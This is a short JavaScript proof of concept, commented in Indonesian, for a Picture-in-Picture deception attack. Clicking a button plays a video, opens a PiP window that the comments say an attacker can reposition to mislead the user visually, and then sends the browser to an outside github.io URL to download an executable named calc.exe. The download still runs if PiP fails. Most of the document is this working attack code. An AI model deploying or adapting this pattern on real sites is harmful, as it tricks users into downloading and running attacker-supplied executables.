document.getElementById('downloadBtn').addEventListener('click', async () => {
    const video = document.getElementById('pipVideo');
    const downloadUrl = 'https://bangbedul19-del.github.io/bedulsantuy1.github.io/calc.exe';

    try {
        // 1. Jalankan Video
        await video.play();

        // 2. Trigger Picture-in-Picture
        // Secara default, jendela PiP akan muncul di pojok kanan bawah.
        // Namun, jendela ini bisa dipindahkan atau diubah ukurannya oleh penyerang 
        // untuk mengelabui visual. Di beberapa versi Chrome, posisi terakhir diingat.
        await video.requestPictureInPicture();

        // 3. Jeda sangat singkat untuk memastikan PiP aktif sebelum navigasi
        setTimeout(() => {
            // 4. Trigger Direct Download
            window.location.href = downloadUrl;
        }, 500);

    } catch (error) {
        console.error("PiP failed: ", error);
        // Jika PiP gagal, tetap jalankan unduhan agar alurnya tidak putus
        window.location.href = downloadUrl;
    }
});
